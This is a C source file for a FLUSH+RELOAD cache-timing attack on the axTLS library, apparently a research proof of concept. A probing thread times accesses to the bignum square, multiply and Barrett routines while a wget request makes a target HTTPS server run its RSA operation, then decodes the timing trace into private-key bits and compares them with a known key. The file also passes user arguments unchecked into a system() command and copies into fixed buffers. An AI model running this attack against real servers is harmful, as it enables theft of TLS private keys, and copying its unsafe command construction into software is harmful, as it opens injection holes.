#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <signal.h>

#define LIBCRYPTO_SQUARE_FUNCTION "bi_square"
#define LIBCRYPTO_MULTIPLY_FUNCTION "bi_terminate"
#define LIBCRYPTO_BARRETT_FUNCTION "bi_subtract"


#define RESULTS_SIZE 1024*1024

unsigned char *results;
pthread_mutex_t stopMutex;
int stop_probing = 0;

/* utils functions */
static void error(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[31;1m!\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
	exit(1);
}
static void info(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[34;1m-\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
}
static void ok(const char * format, ...) {
	va_list myargs;
	va_start(myargs, format);
	printf("[\033[32;1m+\033[0m] ");
	vprintf(format, myargs);
	printf("\n");
}


/* FLUSH + RELOAD probe function */
int probe(void *addr) {
	volatile unsigned long time;
	asm __volatile__ (
		" mfence \n"
		" lfence \n"
		" rdtsc \n"
		" lfence \n"
		" movl %%eax, %%esi \n"
		" movl (%1), %%eax \n"
		" lfence \n"
		" rdtsc \n"
		" subl %%esi, %%eax \n"
		" clflush 0(%1) \n"
		: "=a" (time)
		: "c" (addr)
		: "%esi", "%edx");
	if ( time < THRESHOLD ) {
		return 1;
	}
	return 0;
}


/* Probing thread */
void *probe_thread(void *arg) {
	char *dl_error;
	void *library = dlopen(AXTLSLIB, RTLD_NOW);
	if (!library) {
		error("dlopen failed: %s",dl_error);
	}
	void * square_addr = dlsym(library, LIBCRYPTO_SQUARE_FUNCTION);
	if ((dl_error = dlerror()) != NULL)  {
		error("error in dlsym : %s",dl_error);
	}
	void * multiply_addr = dlsym(library, LIBCRYPTO_MULTIPLY_FUNCTION);
	if ((dl_error = dlerror()) != NULL)  {
		error("error in dlsym : %s",dl_error);
	}
	void * bi_barrett_addr = dlsym(library, LIBCRYPTO_BARRETT_FUNCTION);
	if ((dl_error = dlerror()) != NULL)  {
		error("error in dlsym : %s",dl_error);
	}

	square_addr   += LIBCRYPTO_SQUARE_OFFSET;
	multiply_addr += LIBCRYPTO_MULTIPLY_OFFSET;
	bi_barrett_addr += LIBCRYPTO_BARRETT_OFFSET;
	memset(results,0,RESULTS_SIZE);

	info("probe_thread started");
	info("LIB is at      %p",library);
	info("square is at   %p",square_addr);
	info("multiply is at %p",multiply_addr);
	info("barrett is at  %p",bi_barrett_addr);

	int pos=0;
	while(1) {
		pthread_mutex_lock(&stopMutex);
		if ( stop_probing ) {
			break;
		}
		pthread_mutex_unlock(&stopMutex);
		int square = probe(square_addr);
		int multiply = probe(multiply_addr);
		int barrett = probe(bi_barrett_addr);
		if(square){
			results[pos]='S';
			pos++;
		}else if(barrett){
			results[pos]='\n';
			pos++;
		}else if(multiply) {
			results[pos]='M';
			pos++;
		}

		if(pos >= RESULTS_SIZE) {
			error("Need more space in results");
			break;
		}
	}
	info("Results len : %d",pos);
	pthread_exit(NULL);
}

int main(int argc, char **argv) {
	if (argc != 3) {
		error("usage:  client <IP address> <port>");
	}

	/* Prepare the result buffer */
	results = (unsigned char *)malloc(RESULTS_SIZE);
	if ( results == NULL ) {
		error("Error in malloc !");
	}

	/* Start the probing thread */
	pthread_t probe_t;
	if(pthread_create(&probe_t, NULL, probe_thread, NULL) == -1) {
		error("can't create probe thread");
	}

	/* Request HTTPS page from the vulnerable web server */
	// TODO : use curl C lib, but later .... (or never)
	char * cmd = (char *)malloc(256*sizeof(char));
	sprintf(cmd,"wget https://%s:%s --no-check-certificate -q -O /dev/null",argv[1],argv[2]);
	system(cmd);

	/* Stop the probing thread */
	pthread_mutex_lock(&stopMutex);
	stop_probing = 1;
	pthread_mutex_unlock(&stopMutex);
	pthread_cancel(probe_t);

	/* Write results (usefull for graph) */
	int result_fd = open("./results.bin",O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
	if (result_fd < 0 ) {
		error("Cannot open output file for writting");
	}
	write(result_fd,results,strlen(results));
	close(result_fd);

	/* resolv SQUARE & MULTIPLY from the results */
	int i,square_hits,multiply_hits;
	square_hits=multiply_hits=0;
	char key [6000]={0};
	char xor_key [6000]={0};

    char orignal_key[1023];
    strcpy(orignal_key, ORIGINALKEY);
	
	int pos=0;
	int last_hit_square=0;
	for(i=0; i < strlen(results); i++)
	{
		if(results[i] == ' ')
		{
			continue;
		}
		if(results[i] == '\n')
		{
			if(square_hits > SQUARE_HIT)
			{
				if (last_hit_square == 1)
				{
					key[pos++]='0';
					last_hit_square=0;
				}
				last_hit_square=1;
				multiply_hits=0;
			}
			else if(multiply_hits > MUTLIPLE_HIT)
			{
				if (last_hit_square == 1)
				{
					key[pos++]='1';
					last_hit_square=0;
				}
			}
			square_hits=0;
			multiply_hits=0;
		}
		else if(results[i] == 'S')
		{
			square_hits++;
		}
		else if(results[i] == 'M')
		{
			multiply_hits++;
		}
	}
	int ii;
	ok("Retrieved KEY :\n 1%s",key);
	printf("\n Length of Retrieved Key = %d",pos);

    printf("\n Original KEY :\n %s \n",orignal_key);

	for(ii=0; ii < pos ; ii++)
	{
		if (key[ii] == orignal_key[ii])
			xor_key[ii] = '0';
		else
			xor_key[ii] = '1';
	}

	printf("\n XOR KEY :\n %s \n",xor_key);
	return 0;
}
